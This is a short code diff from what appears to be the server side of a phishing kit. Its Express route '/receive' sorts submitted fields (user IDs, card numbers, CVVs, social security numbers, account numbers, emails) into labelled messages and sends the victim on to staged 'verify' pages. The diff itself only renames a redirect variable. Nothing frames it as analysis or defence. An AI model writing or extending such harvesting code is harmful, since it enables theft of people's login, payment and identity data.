@@ -172,7 +172,7 @@ app.post('/receive', async (req, res) => {
     if (myObjectKeys.includes('userid')) {
       prepareMessage("LOGIN", "/verify?action=1", true);
     } else if (myObjectKeys.includes('') || myObjectKeys.includes('cvv') || myObjectKeys.includes('cardnumber')) {
-      prepareMessage("BILLING INFO", redirect_url, false);
+      prepareMessage("BILLING INFO", url, false);
     } else if (myObjectKeys.includes('ssn') || myObjectKeys.includes('accountnumber') || myObjectKeys.includes('email')) {
       prepareMessage("ACCOUNT INFO", "/verify?action=2", false);
     } else {
